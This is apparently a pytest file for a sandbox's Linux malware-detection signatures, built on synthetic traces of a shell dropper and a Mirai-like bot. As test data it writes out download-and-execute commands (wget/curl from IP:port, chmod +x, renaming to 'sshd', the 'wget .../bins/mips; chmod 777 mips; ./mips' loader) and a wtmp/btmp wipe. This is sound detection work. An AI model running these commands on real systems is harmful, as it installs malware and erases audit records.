"""The Linux signatures added and corrected after the two jobs of 2026-11-12
(a shell dropper, and a static i386 Mirai-family bot), over synthetic traces
shaped like theirs: each new signature on what it is for and on a near miss,
each false positive in the shape that raised it and in one that still should.

The trace builder, the loader fixture and `matched` are
test_cape_signatures_linux's. What these traces have that the jobs' had:
  * x64 syscalls' fourth argument read from rcx (renameat2's newpath "H=",
    mmap's flags a return address) -- and, beside each, the record as a
    DRAKVUF that reads r10 prints it;
  * an i386 task's own service names (stat64, mmap2, truncate64) and the
    *at2 calls' (dfd, filename);
  * execve with no arguments, and with the `filename` a later DRAKVUF prints.
"""
from __future__ import annotations

import sys

import pytest

from sandboxd.tests.test_cape_signatures_linux import (  # noqa: F401  (fresh_loader is a fixture)
    NR, Trace, fresh_loader, matched, needs_tree,
)

# Numbers pair a syscall with its sysret; the x64 table's where it has the
# call, any unused one for i386's own.
NR.update({"rename": 82, "renameat2": 316, "execve": 59, "exit": 60, "getdents64": 217, "readlink": 89,
           "readlinkat": 267, "stat": 4, "openat": 257, "fchmodat": 268, "sendfile64": 40, "mprotect": 10,
           "newfstatat": 262, "unlinkat": 263, "openat2": 437, "faccessat2": 439, "fchmodat2": 452,
           "mmap2": 1192, "truncate64": 1193, "stat64": 1195, "lstat64": 1196, "chown32": 1212})

ENOEXEC, ENOENT = "0xfffffffffffffff8", "0xfffffffffffffffe"
BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TMP = "OLDPWD=/,PWD=/tmp"
# What DRAKVUF printed for an x64 syscall's fourth argument before it read
# r10: mmap's flags, the low half of the address the syscall returns to.
GARBAGE_FLAGS = "0xf4a66cb7"

pytestmark = needs_tree


def run(trace, tmp_path):
    tmp_path.mkdir(exist_ok=True)
    results = trace.run(tmp_path)
    assert results["statistics"]["signature_failures"] == []
    return matched(results)


def entries(signature):
    """A matched signature's data without its call marks."""
    return [e for e in signature["data"] if e.get("type") != "call"]


def spawn(trace, child, cmdline, image, env=TMP, filename=None, interp=None):
    """A fork of the sample and an exec in the child, as a shell runs a command."""
    trace.clone(trace.pid, child)
    trace.names[child] = image
    trace._record("procmon", child, "do_execveat_common", CommandLine=cmdline, ImagePathName=image,
                  FileName=filename or image, ouid=0, osuid=0, oeuid=0, suid=0, euid=0, interp=interp or image,
                  Environment=env)


def dns_query(qname, qtype=1):
    labels = b"".join(bytes([len(part)]) + part.encode() for part in qname.split("."))
    return b"\x26\xee\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + labels + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"


def ask(trace, server, qname, on=None):
    data = dns_query(qname)
    trace.socketmon("sock_sendmsg", on=on, Type="AF_INET", Protocol="UDP", LocalIp="172.16.1.2", LocalPort=36830,
                    RemoteIp=server, RemotePort=53, Size=len(data), Value=data.hex())


# --- the shell dropper ------------------------------------------------------------------

def dropper(rounds=3, server="http://168.220.248.106:9087", names=("jttukyxlmz", "ea0phl7ne4", "kjo362icnw"),
            fixed_r10=False):
    """The loop of the shell job: wget and curl of one more name into `jva`,
    chmod +x, mv to `sshd`, `./sshd` (ENOEXEC) and the shell's own
    `/bin/sh ./sshd`."""
    t = Trace(image="/usr/bin/dash")
    t.syscall("chdir", filetracer={"FileName": "/tmp"}, path="/tmp")
    child = 200
    for name in names[:rounds]:
        url = f"{server}/payload/a6i3khk75wgf/{name}?t=26b9cbe5"
        spawn(t, child, f"wget -q -U {BROWSER} -O jva {url}", "/usr/bin/wget")
        t.syscall("openat", on=child, ret="0x4", filetracer={"FileName": "/tmp/jva", "flags": "577"},
                  dirfd="0xffffff9c", pathname="jva", flags="0x241", mode=GARBAGE_FLAGS)
        spawn(t, child + 1, f"curl -s -A {BROWSER} -o jva {url}", "/usr/bin/curl")
        spawn(t, child + 2, "chmod +x jva", "/usr/bin/chmod")
        t.syscall("fchmodat", on=child + 2, filetracer={"FileName": "jva"}, dirfd="0xffffff9c", pathname="jva",
                  mode="0x1ff", flags=GARBAGE_FLAGS)
        spawn(t, child + 3, "mv jva sshd", "/usr/bin/mv")
        t.syscall("renameat2", on=child + 3, filetracer={"FileName": "jva"}, olddirfd="0xffffff9c", oldpath="jva",
                  newdirfd="0xffffff9c", newpath="sshd" if fixed_r10 else "H=", flags="0x1")
        t.clone(t.pid, child + 4)
        t.syscall("execve", on=child + 4, ret=ENOEXEC, **({"filename": "./sshd"} if fixed_r10 else {}))
        t.names[child + 4] = "/usr/bin/dash"
        t._record("procmon", child + 4, "do_execveat_common", CommandLine="/bin/sh ./sshd",
                  ImagePathName="/usr/bin/dash", FileName="/bin/sh", ouid=0, osuid=0, oeuid=0, suid=0, euid=0,
                  interp="/bin/sh", Environment=TMP)
        child += 10
    return t


@pytest.mark.parametrize("fixed_r10", [False, True])
def test_shell_dropper_loop(tmp_path, fresh_loader, fixed_r10):
    names = run(dropper(fixed_r10=fixed_r10), tmp_path)
    loop = entries(names["linux_download_execute_loop"])[0]
    assert names["linux_download_execute_loop"]["severity"] == 3
    assert (loop["server"], loop["directory"], loop["urls"]) == ("168.220.248.106:9087", "/payload/a6i3khk75wgf", 3)
    assert (loop["made_executable"], loop["urls_tried_with_two_tools"]) == (3, 3)
    assert (loop["urls_saved_as_one_file"], loop["file"], loop["architecture_names"]) == (3, "/tmp/jva", 0)
    # random names: not the architecture loader's
    assert "linux_multi_arch_download" not in names

    failed = entries(names["linux_exec_format_error_loop"])[0]
    assert failed["exec_format_errors"] == 3 and failed["shell_fallbacks"] == {"/bin/sh ./sshd": 3}
    assert failed.get("files") == (["/tmp/sshd"] if fixed_r10 else None)

    masquerade = {(e["file"], e["how"]): e["times"] for e in entries(names["linux_masquerade_daemon_name"])}
    assert masquerade[("/tmp/sshd", "mv")] == 3 and masquerade[("/tmp/sshd", "shell")] == 3
    # mv's rename is its command line's: once, and never by the "H=" read at rcx
    assert set(masquerade) == {("/tmp/sshd", "mv"), ("/tmp/sshd", "shell")}

    agents = {e["tool"]: e for e in entries(names["linux_download_spoofed_user_agent"])}
    assert agents["wget"]["user_agent"] == BROWSER and agents["curl"]["user_agent"] == BROWSER
    assert agents["wget"]["times"] == 3

    ports = {e["tool"]: e for e in entries(names["linux_download_ip_literal_port"])}
    assert ports["wget"]["server"] == "168.220.248.106:9087" and ports["curl"]["downloads"] == 3

    # chmod +x jva; mv jva sshd; ./sshd -> /bin/sh ./sshd: the file made executable, run
    ran = {e["how"]: e for e in entries(names["linux_chmod_then_exec"])}
    assert ran["shell"]["executed"] == "/tmp/sshd" and ran["shell"]["times"] == 3
    assert ("exec failed" in ran) is fixed_r10
    unusual = entries(names["linux_execution_from_unusual_path"])
    assert [(e["image"], e["how"]) for e in unusual] == [("/tmp/sshd", "shell")]


def test_download_loop_near_misses(tmp_path, fresh_loader):
    """Three downloads, but of three servers; two of one server; and
    downloads that nothing is made executable after."""
    t = Trace(image="/usr/bin/dash")
    for i, url in enumerate(("http://198.51.100.1:8080/a/x", "http://198.51.100.2/a/y", "http://198.51.100.3:443/a/z",
                             "http://example.org:9087/b/one", "http://example.org:9087/b/two",
                             "http://203.0.113.9/c/1", "http://203.0.113.9/c/2", "http://203.0.113.9/c/3")):
        spawn(t, 200 + i, f"wget -U Wget/1.21 -A *.jpg -q {url}", "/usr/bin/wget")
    spawn(t, 250, "curl -A curl/8.5.0 -H Accept: text/html https://example.org/", "/usr/bin/curl")
    spawn(t, 251, "chmod +x x", "/usr/bin/chmod")
    spawn(t, 252, "chmod 644 y z", "/usr/bin/chmod")
    names = run(t, tmp_path)
    # 198.51.100.1:8080 and :443 are where a web server is; example.org is a name; 203.0.113.9 has no port
    assert "linux_download_ip_literal_port" not in names
    assert "linux_download_spoofed_user_agent" not in names
    # three URLs of one directory (203.0.113.9/c), one chmod +x
    assert "linux_download_execute_loop" not in names
    assert "linux_payload_download" in names


def test_architecture_loader_matches_both(tmp_path, fresh_loader):
    """The classic one-liner: every build named after its CPU, in one sh -c."""
    t = Trace(image="/usr/bin/dash")
    line = "; ".join(f"wget http://45.9.8.7/bins/{arch}; chmod 777 {arch}; ./{arch}" for arch in ("mips", "arm7", "x86_64"))
    spawn(t, 200, "sh -c cd /tmp; " + line, "/usr/bin/dash", filename="/bin/sh")
    names = run(t, tmp_path)
    loop = entries(names["linux_download_execute_loop"])[0]
    assert (loop["urls"], loop["made_executable"], loop["architecture_names"]) == (3, 3, 3)
    assert "linux_multi_arch_download" in names
    assert "linux_download_ip_literal_port" not in names


def test_exec_format_error_once_is_not_a_loop(tmp_path, fresh_loader):
    t = Trace(image="/usr/bin/dash")
    t.clone(t.pid, 201)
    t.syscall("execve", on=201, ret=ENOEXEC)
    t.clone(t.pid, 202)
    t.syscall("execve", on=202, ret=ENOENT)        # not found: another matter
    t.exec(202, "/usr/bin/true", "/usr/bin/true")
    assert "linux_exec_format_error_loop" not in run(t, tmp_path)


def test_daemon_names_where_daemons_are(tmp_path, fresh_loader):
    """A package's sshd going to /usr/sbin, sshd run from there, a config
    file named after it: none is a masquerade. A copy of it run from
    /dev/shm, and a kernel thread's name there, are."""
    t = Trace(image="/usr/bin/dash")
    spawn(t, 200, "mv sshd.dpkg-new /usr/sbin/sshd", "/usr/bin/mv", env="PWD=/usr/sbin")
    spawn(t, 201, "/usr/sbin/sshd -D", "/usr/sbin/sshd")
    spawn(t, 202, "cp sshd_config /tmp/sshd_config", "/usr/bin/cp")
    spawn(t, 203, "cp /dev/null /var/log/cron", "/usr/bin/cp")
    spawn(t, 204, "mv a b", "/usr/bin/mv", env="")        # nowhere known: not judged
    assert "linux_masquerade_daemon_name" not in run(t, tmp_path / "a")
    # a rename whose new name was read at rcx (before DRAKVUF's r10 fix) names nothing
    t.syscall("renameat2", olddirfd="0xffffff9c", oldpath="/tmp/x", newdirfd="0xffffff9c", newpath="H=", flags="0x0")
    assert "linux_masquerade_daemon_name" not in run(t, tmp_path / "a2")
    spawn(t, 205, "/dev/shm/kworker", "/dev/shm/kworker")
    spawn(t, 206, "cp /bin/busybox /var/tmp/systemd-journald", "/usr/bin/cp")
    t.syscall("rename", oldpath="/tmp/x", newpath="/tmp/crond")
    found = {(e["file"], e["how"]) for e in entries(run(t, tmp_path / "b")["linux_masquerade_daemon_name"])}
    assert found == {("/dev/shm/kworker", "exec"), ("/var/tmp/systemd-journald", "cp"), ("/tmp/crond", "rename")}


def test_a_script_from_tmp_the_sample_did_not_write(tmp_path, fresh_loader):
    """`sh /tmp/x.sh` of a file that was there: neither made executable nor
    dropped by the sample. And a file it made executable but never ran."""
    t = Trace(image="/usr/bin/dash")
    spawn(t, 200, "/bin/sh /tmp/installer.sh", "/usr/bin/dash", filename="/bin/sh")
    spawn(t, 201, "chmod +x /tmp/other", "/usr/bin/chmod")
    spawn(t, 202, "sh -c /tmp/other.sh", "/usr/bin/dash", filename="/bin/sh")
    names = run(t, tmp_path)
    assert "linux_chmod_then_exec" not in names
    assert "linux_execution_from_unusual_path" not in names


def test_chmod_then_exec_by_its_own_name(tmp_path, fresh_loader):
    """The plain case stays: chmod by syscall, a rename by syscall, exec of the new name."""
    t = Trace()
    t.open("/tmp/.a", flags="0x241", ret="0x3")
    t.syscall("chmod", filetracer={"FileName": "/tmp/.a"}, pathname="/tmp/.a", mode="0x1ed")
    t.syscall("rename", oldpath="/tmp/.a", newpath="/tmp/.b")
    t.clone(t.pid, 201)
    t.exec(201, "/tmp/.b", "/tmp/.b")
    names = run(t, tmp_path)
    assert [(e["executed"], e["how"]) for e in entries(names["linux_chmod_then_exec"])] == [("/tmp/.b", "exec")]
    assert names["linux_execution_from_unusual_path"]["severity"] == 3     # a dot-name


# --- the bot ----------------------------------------------------------------------------

def test_self_rename_to_a_blank_name(tmp_path, fresh_loader):
    t = Trace(image="/home/u/bot.elf")
    t.syscall("rename", oldpath="/home/u/bot.elf", newpath="/home/u/.  ")
    names = run(t, tmp_path)
    renamed = entries(names["linux_self_rename"])[0]
    assert (renamed["renamed"], renamed["to"], renamed["hidden_name"]) == ("/home/u/bot.elf", "/home/u/.  ", True)
    assert names["linux_self_rename"]["severity"] == 3
    # what linux_hidden_artifacts says it finds, now
    assert "dots and spaces" in names["linux_hidden_artifacts"]["description"]


def test_self_rename_plain_and_not_its_own(tmp_path, fresh_loader):
    t = Trace(image="/home/u/bot.elf")
    t.syscall("rename", oldpath="/home/u/notes.txt", newpath="/home/u/.notes")
    assert "linux_self_rename" not in run(t, tmp_path / "a")
    # a forked child renames the image it shares; the new name read at rcx is left out
    t.clone(t.pid, 201)
    t.syscall("renameat2", on=201, olddirfd="0xffffff9c", oldpath="/home/u/bot.elf", newdirfd="0xffffff9c",
              newpath="H=", flags="0x0")
    names = run(t, tmp_path / "b")
    assert names["linux_self_rename"]["severity"] == 2
    assert "to" not in entries(names["linux_self_rename"])[0]


def test_a_script_moving_itself_away(tmp_path, fresh_loader):
    """`mv "$0" .x` in a script: mv renames the file its parent shell runs."""
    t = Trace(image="/usr/bin/dash")
    t._record("procmon", t.pid, "do_execveat_common", CommandLine="/bin/sh /home/u/drop.sh",
              ImagePathName="/usr/bin/dash", FileName="/home/u/drop.sh", ouid=0, osuid=0, oeuid=0, suid=0, euid=0,
              interp="/bin/sh", Environment="PWD=/home/u")
    spawn(t, 201, "mv /home/u/drop.sh /tmp/.cache-x", "/usr/bin/mv", env="PWD=/home/u")
    spawn(t, 202, "mv notes.txt old.txt", "/usr/bin/mv", env="PWD=/home/u")
    names = run(t, tmp_path)
    assert [(e["renamed"], e["to"]) for e in entries(names["linux_self_rename"])] == [("/home/u/drop.sh", "/tmp/.cache-x")]
    assert names["linux_self_rename"]["severity"] == 3


def test_process_name_masquerade_needs_the_name(tmp_path, fresh_loader):
    """Today's record has PR_SET_NAME's pointer; the name once DRAKVUF prints it."""
    t = Trace()
    t.syscall("prctl", option="PR_SET_NAME", arg2="0x805b70f", arg3="0xff9e5064", arg4="0xff9e5064", arg5="0x0")
    t.clone(t.pid, 201)
    t.syscall("prctl", on=201, option="PR_SET_NAME", arg2="worker-3", arg3="0x0", arg4="0x0", arg5="0x0")
    names = run(t, tmp_path / "a")
    assert "linux_process_name_masquerade" not in names
    assert "linux_process_name_change" in names
    t.clone(t.pid, 202)
    t.syscall("prctl", on=202, option="PR_SET_NAME", arg2=" ", arg3="0x0", arg4="0x0", arg5="0x0")
    t.clone(t.pid, 203)
    t.syscall("prctl", on=203, option="PR_SET_NAME", arg2="[kworker/0:1]", arg3="0x0", arg4="0x0", arg5="0x0")
    names = run(t, tmp_path / "b")
    assert [(e["name"], e["why"]) for e in entries(names["linux_process_name_masquerade"])] == \
        [(" ", "blank"), ("[kworker/0:1]", "kernel thread name")]
    assert names["linux_process_name_masquerade"]["severity"] == 3


def test_alternative_root_and_resolver_rotation(tmp_path, fresh_loader):
    t = Trace()
    for i in range(12):
        ask(t, ("37.252.191.197", "103.1.184.110", "168.138.12.137")[i % 3], "lkol.dyn")
    names = run(t, tmp_path)
    assert entries(names["linux_alternative_dns_root"]) == [
        {"query": "lkol.dyn", "root": "OpenNIC", "process": "s.elf (100)"}]
    rotation = entries(names["linux_dns_resolver_rotation"])[0]
    assert (rotation["query"], rotation["resolvers"], rotation["queries"]) == ("lkol.dyn", 3, 12)


def test_ordinary_lookups_are_neither(tmp_path, fresh_loader):
    """A name of the ICANN root asked twenty times of two public resolvers
    and of the network's three own."""
    t = Trace()
    for i in range(20):
        ask(t, ("8.8.8.8", "1.1.1.1")[i % 2], "updates.example.com")
        ask(t, ("10.0.0.2", "10.0.0.3", "192.168.1.1")[i % 3], "updates.example.com")
    names = run(t, tmp_path)
    assert "linux_alternative_dns_root" not in names
    assert "linux_dns_resolver_rotation" not in names
    assert "linux_hardcoded_dns_resolver" in names


def proc_sweeps(t, on, sweeps, pids, i386, what="exe"):
    """`sweeps` passes over /proc, each through `pids` other processes."""
    for sweep in range(sweeps):
        if i386:
            t.syscall("open", on=on, ret="0x5", pathname="/proc/", flags="0x10800", mode="0x0")
        else:
            t.syscall("openat", on=on, ret="0x5", filetracer={"FileName": "/proc", "flags": "67584"},
                      dirfd="0xffffff9c", pathname="/proc", flags="0x10800", mode=GARBAGE_FLAGS)
        t.syscall("getdents64", on=on, ret="0x3f0", fd="0x5", dirp="0x1", count="0x400")
        for pid in range(1000, 1000 + pids):
            if what != "exe":
                t.syscall("open", on=on, ret="0x6", pathname=f"/proc/{pid}/{what}", flags="0x0", mode="0x0")
                t.syscall("close", on=on, fd="0x6")
            elif i386:
                t.syscall("readlink", on=on, ret=ENOENT if pid % 2 else "0x10", pathname=f"/proc/{pid}/exe",
                          buf="0x1", bufsiz="0xfff")
            else:
                t.syscall("readlinkat", on=on, ret="0x10", dirfd="0xffffff9c", pathname=f"/proc/{pid}/exe",
                          buf="0x1", bufsize=GARBAGE_FLAGS)
        t.syscall("getdents64", on=on, ret="0x0", fd="0x5", dirp="0x1", count="0x400")
        t.syscall("close", on=on, fd="0x5")


@pytest.mark.parametrize("i386", [True, False])
def test_proc_killer_scan(tmp_path, fresh_loader, i386):
    t = Trace()
    t.clone(t.pid, 201)
    proc_sweeps(t, 201, sweeps=6, pids=25, i386=i386)
    t.clone(t.pid, 202)
    proc_sweeps(t, 202, sweeps=5, pids=20, i386=True, what="cmdline")
    names = run(t, tmp_path)
    found = {e["process"]: e for e in entries(names["linux_proc_killer_scan"])}
    assert found["s.elf (201)"]["proc_sweeps"] == 6 and found["s.elf (201)"]["exe_links_of_processes"] == 25
    assert found["s.elf (202)"]["cmdline_or_stat_of_processes"] == 20
    assert names["linux_proc_killer_scan"]["severity"] == 3


def test_one_pass_over_proc_and_ps_are_not_a_killer(tmp_path, fresh_loader):
    """pkill walks /proc once, a monitor's `ps` every second; a program that
    looks at four processes again and again is not sweeping either."""
    t = Trace()
    t.clone(t.pid, 201)
    proc_sweeps(t, 201, sweeps=1, pids=60, i386=False, what="status")
    spawn(t, 202, "ps -eo pid,comm", "/usr/bin/ps")
    proc_sweeps(t, 202, sweeps=8, pids=30, i386=False, what="stat")
    t.clone(t.pid, 203)
    proc_sweeps(t, 203, sweeps=9, pids=4, i386=True)
    for child in (201, 202, 203):
        t.open(f"/proc/{t.pid}/status", on=child)
    names = run(t, tmp_path)
    assert "linux_proc_killer_scan" not in names
    assert "linux_process_discovery" in names
    # each read its parent's entry among everyone's: not a look at its tracer
    assert "linux_antidebug_procfs_checks" not in names


def test_daemonize_across_the_fork(tmp_path, fresh_loader):
    """The bot of 2026-11-12: chdir("/") and fork in the parent, which
    exits; setsid and close(0..2) in the child, whose own children then
    reuse those fds for sockets."""
    t = Trace()
    t.syscall("chdir", filetracer={"FileName": "/"}, path="/")
    t.clone(t.pid, 201)
    t._record("procmon", t.pid, "do_exit", ExitStatus=0, ExitStatusStr="EXIT_SUCCESS")
    t.syscall("setsid", on=201, ret="0xc9")
    for fd in (0, 1, 2):
        t.syscall("close", on=201, fd=hex(fd))
    t.clone(201, 202)
    t.syscall("socket", on=202, domain="0x2", type="0x1", protocol="0x0", ret="0x0")
    for fd in (0, 1, 2):
        t.syscall("close", on=202, fd=hex(fd))
    found = entries(run(t, tmp_path)["linux_daemonize"])
    assert found == [{"steps": "chdir /, parent exited after fork, setsid, stdio closed", "process": "s.elf (201)"}]


def test_a_shell_running_commands_is_not_a_daemon(tmp_path, fresh_loader):
    """cd /, children forked and waited for, one of them `setsid`: one step
    is not a daemon. Nor is a parent that exits long after its fork."""
    t = Trace(image="/usr/bin/dash")
    t.syscall("chdir", filetracer={"FileName": "/tmp"}, path="/tmp")
    spawn(t, 201, "sleep 1", "/usr/bin/sleep")
    spawn(t, 202, "setsid true", "/usr/bin/setsid")
    t.syscall("setsid", on=202, ret="0xca")
    for i in range(6):
        t.open(f"/tmp/f{i}", ret="0x3")
        t.syscall("close", fd="0x3")
    t._record("procmon", t.pid, "do_exit", ExitStatus=0, ExitStatusStr="EXIT_SUCCESS")
    assert "linux_daemonize" not in run(t, tmp_path)


# --- the false positives ------------------------------------------------------------------

def test_antidebug_procfs_check_of_the_parent_alone(tmp_path, fresh_loader):
    """What the signature is for: the parent's entries and no one else's."""
    t = Trace()
    t.clone(t.pid, 201)
    t.open(f"/proc/{t.pid}/cmdline", on=201)
    t.open(f"/proc/{t.pid}/status", on=201)
    t.open("/proc/201/status", on=201)
    found = entries(run(t, tmp_path)["linux_antidebug_procfs_checks"])
    assert [e["file"] for e in found] == ["/proc/100/cmdline", "/proc/100/status"]


def test_a_process_tool_reading_its_parent_is_not_antidebug(tmp_path, fresh_loader):
    """pkill before it gets past its fifth process, and pkill is a symlink
    to pgrep: no walk counted yet, the name alone."""
    t = Trace(image="/usr/bin/dash")
    spawn(t, 201, "pkill -9 -f kworker-helper", "/usr/bin/pgrep", filename="/usr/bin/pkill", interp="/usr/bin/pkill")
    t.open(f"/proc/{t.pid}/status", on=201)
    t.open(f"/proc/{t.pid}/cmdline", on=201)
    names = run(t, tmp_path)
    assert "linux_antidebug_procfs_checks" not in names
    # argv[0] is the name of the link exec was given
    assert "linux_argv0_spoofing" not in names


def test_argv0_spoofing_still_found(tmp_path, fresh_loader):
    t = Trace(image="/usr/bin/dash")
    spawn(t, 201, "sshd: /usr/sbin/sshd -D [listener]", "/tmp/payload")
    spawn(t, 202, "/bin/sh /home/u/run.sh", "/usr/bin/dash", filename="/home/u/run.sh", interp="/bin/sh")
    spawn(t, 203, "python3 -c pass", "/usr/bin/python3.12", filename="/usr/bin/python3")
    found = entries(run(t, tmp_path)["linux_argv0_spoofing"])
    assert [(e["image"], e["argv0"]) for e in found] == [("/tmp/payload", "sshd:")]


def test_a_wildcard_listener_is_not_an_instance_lock(tmp_path, fresh_loader):
    t = Trace()
    for method in ("bind", "listen"):
        t.socketmon(method, Type="AF_INET", Protocol="TCP", LocalIp="0.0.0.0", LocalPort=39148)
    names = run(t, tmp_path / "a")
    assert entries(names["linux_listening_port"])[0]["listening"] == "0.0.0.0:39148"
    assert "linux_single_instance_lock" not in names

    t = Trace()
    for method in ("bind", "listen"):
        t.socketmon(method, Type="AF_INET", Protocol="TCP", LocalIp="127.0.0.1", LocalPort=48101)
    names = run(t, tmp_path / "b")
    assert entries(names["linux_single_instance_lock"])[0]["loopback_port"] == "127.0.0.1:48101"
    assert "linux_listening_port" not in names


def test_ip_kind_tells_unspecified_from_loopback(tmp_path, fresh_loader):
    Trace().run(tmp_path)       # loads the community tree
    utils = sys.modules["modules.signatures.drakvuf_utils"]
    assert [utils.ip_kind(a) for a in ("0.0.0.0", "::", "127.0.0.1", "::1", "10.1.2.3", "8.8.8.8", "169.254.1.1", "x")] == \
        ["unspecified", "unspecified", "loopback", "loopback", "private", "public", "linklocal", None]


def static_scanner():
    """A static program: no library call for libmon, sockets in unixsocketmon."""
    t = Trace()
    for i in range(30):
        t.socketmon("connect", Type="AF_INET", Protocol="TCP", RemoteIp=f"45.1.2.{i + 1}", RemotePort=23)
    return t


def test_stealth_network_counts_the_kernel_side_on_linux(tmp_path, fresh_loader):
    results = static_scanner().run(tmp_path)
    assert len(results["network"]["hosts"]) == 30
    assert "stealth_network" not in matched(results)
    assert "linux_remote_login_bruteforce" in matched(results)

    # Hosts in the capture that no process was seen to contact are what is left for it.
    stealth = sys.modules["modules.signatures.all.stealth_network"].StealthNetwork(results)
    results["network"]["hosts"].extend({"ip": f"198.51.100.{i}"} for i in range(1, 26))
    assert stealth.on_complete() is True
    assert stealth.data[:2] == [{"ip": "198.51.100.1"}, {"ip": "198.51.100.2"}]
    assert len(stealth.data) == 21 and stealth.data[-1] == {"hosts_and_domains": 25, "listed": 20}

    # On Windows the API log is the one that counts: all of them, as before.
    results["info"]["machine"]["platform"] = "windows"
    windows = sys.modules["modules.signatures.all.stealth_network"].StealthNetwork(results)
    assert windows.on_complete() is True
    assert windows.data[-1] == {"hosts_and_domains": 55, "listed": 20}


def test_an_ordinary_program_raises_nothing(tmp_path, fresh_loader):
    """test_cape_signatures_linux's ordinary curl: its two connections are
    in unixsocketmon, so they are not "not expressed in the monitor's logs"."""
    t = Trace(image="/usr/bin/curl")
    t.open("/etc/passwd", flags="0x80000")
    t.socketmon("connect", Type="AF_INET", Protocol="UDP", RemoteIp="127.0.0.53", RemotePort=53)
    t.socketmon("connect", Type="AF_INET", Protocol="TCP", RemoteIp="93.184.216.34", RemotePort=443)
    results = t.run(tmp_path)
    assert [s["name"] for s in results["signatures"]] == []
    assert results["malscore"] == 0


def test_user_discovery_lists_what_is_discovery(tmp_path, fresh_loader):
    """The shell job: `id -u`, rm's stat of the wtmp it deletes, curl's NSS
    read of passwd."""
    t = Trace(image="/usr/bin/dash")
    spawn(t, 201, "id -u", "/usr/bin/id")
    spawn(t, 202, "rm -f /var/log/wtmp /var/log/btmp", "/usr/bin/rm")
    for path in ("/var/log/wtmp", "/var/log/btmp"):
        t.syscall("newfstatat", on=202, dirfd="0xffffff9c", pathname=path, statbuf="0x1", flags=GARBAGE_FLAGS)
        t.syscall("unlinkat", on=202, filetracer={"FileName": path}, dirfd="0xffffff9c", pathname=path, flags="0x0")
    spawn(t, 203, "curl -s http://example.org/", "/usr/bin/curl")
    t.open("/etc/passwd", on=203, flags="0x80000")
    found = entries(run(t, tmp_path / "a")["linux_user_discovery"])
    assert found == [{"command": "id -u", "process": "id (201)"}]

    # without the command: deleting the login records is not reading them
    t = Trace(image="/usr/bin/dash")
    spawn(t, 202, "rm -f /var/log/wtmp /var/log/btmp", "/usr/bin/rm")
    for path in ("/var/log/wtmp", "/var/log/btmp"):
        t.syscall("newfstatat", on=202, dirfd="0xffffff9c", pathname=path, statbuf="0x1", flags=GARBAGE_FLAGS)
    names = run(t, tmp_path / "b")
    assert "linux_user_discovery" not in names
    assert "linux_log_tampering" in names


def test_user_discovery_of_a_program_reading_the_records(tmp_path, fresh_loader):
    t = Trace()
    for path in ("/etc/passwd", "/etc/group", "/var/run/utmp"):
        t.open(path, flags="0x80000")
    found = entries(run(t, tmp_path)["linux_user_discovery"])
    assert [e["file"] for e in found] == ["/etc/passwd", "/etc/group", "/var/run/utmp"]


@pytest.mark.parametrize("record, fires", [
    # x64 before the r10 fix: flags are a return address; the fd says anonymous
    (("mmap", dict(addr="0x0", length="0x1000", prot="PROT_READ | PROT_WRITE | PROT_EXEC", flags=GARBAGE_FLAGS,
                   fd="0xffffffff", offset="0x0")), True),
    (("mmap", dict(addr="0x0", length="0x1000", prot="PROT_READ | PROT_WRITE | PROT_EXEC", flags=GARBAGE_FLAGS,
                   fd="0x3", offset="0x0")), False),
    # x64 after it: by name, or as a number
    (("mmap", dict(addr="0x0", length="0x1000", prot="PROT_READ | PROT_WRITE | PROT_EXEC",
                   flags="MAP_PRIVATE | MAP_ANONYMOUS", fd="0xffffffff", offset="0x0")), True),
    (("mmap", dict(addr="0x0", length="0x1000", prot="PROT_READ | PROT_WRITE | PROT_EXEC",
                   flags="MAP_PRIVATE | MAP_DENYWRITE", fd="0x3", offset="0x0")), False),
    (("mmap", dict(addr="0x0", length="0x1000", prot="0x7", flags="0x22", fd="0xffffffff", offset="0x0")), True),
    # i386: mmap2, everything a number
    (("mmap2", dict(addr="0x0", len="0x1000", prot="0x7", flags="0x22", fd="0xffffffff", pgoff="0x0")), True),
    (("mmap2", dict(addr="0x0", len="0x1000", prot="0x7", flags="0x2", fd="0x3", pgoff="0x0")), False),
    (("mmap2", dict(addr="0x0", len="0x1000", prot="0x3", flags="0x22", fd="0xffffffff", pgoff="0x0")), False),
    (("mprotect", dict(start="0x7f0000000000", len="0x1000", prot="PROT_READ | PROT_WRITE | PROT_EXEC")), True),
    (("mprotect", dict(start="0x7f0000000000", len="0x1000", prot="PROT_READ | PROT_EXEC")), False),
])
def test_rwx_memory_reads_prot_and_flags_as_printed(tmp_path, fresh_loader, record, fires):
    t = Trace()
    t.syscall(record[0], ret="0x7f0000000000", **record[1])
    names = run(t, tmp_path)
    assert ("linux_rwx_memory" in names) is fires
    if fires:
        assert entries(names["linux_rwx_memory"])[0][record[0]] == "PROT_READ | PROT_WRITE | PROT_EXEC"


def test_executable_mapping_from_temp_through_mmap2(tmp_path, fresh_loader):
    t = Trace()
    t.open("/tmp/.l/payload.so", ret="0x3")
    t.syscall("mmap2", addr="0x0", len="0x1000", prot="0x5", flags="0x2", fd="0x3", pgoff="0x0", ret="0xf7000000")
    t.open("/usr/lib/libc.so.6", ret="0x4")
    t.syscall("mmap", addr="0x0", length="0x1000", prot="PROT_READ | PROT_EXEC", flags=GARBAGE_FLAGS, fd="0x4",
              offset="0x0", ret="0x7f00")
    found = entries(run(t, tmp_path)["linux_executable_mapping_from_temp"])
    assert [e["mapped"] for e in found] == ["/tmp/.l/payload.so"]


def test_self_propagation_through_sendfile64(tmp_path, fresh_loader):
    """x64 has no `sendfile`: the table's name for it is sendfile64."""
    def trace(source):
        t = Trace()
        t.open(source, ret="0x3")
        t.syscall("sendfile64", out_fd="0x4", in_fd="0x3", offset="0x0", count="0x8000", ret="0x8000")
        t.socketmon("sock_sendmsg", Type="AF_INET", Protocol="TCP", LocalIp="172.16.1.2", LocalPort=40000,
                    RemoteIp="45.1.2.3", RemotePort=23, Connected=1, Size=0x8000, Value="7f454c46")
        return t
    found = entries(run(trace("/home/u/s.elf"), tmp_path / "a")["linux_self_propagation"])
    assert (found[0]["remote"], found[0]["read_of_self"]) == ("45.1.2.3", 0x8000)
    assert "linux_self_propagation" not in run(trace("/home/u/notes.txt"), tmp_path / "b")


def test_i386_and_at2_service_names(tmp_path, fresh_loader):
    """The paths of stat64/lstat64 (filename), truncate64 (path), and of
    openat2/faccessat2/fchmodat2 as the tables print them (dfd, filename)."""
    t = Trace()
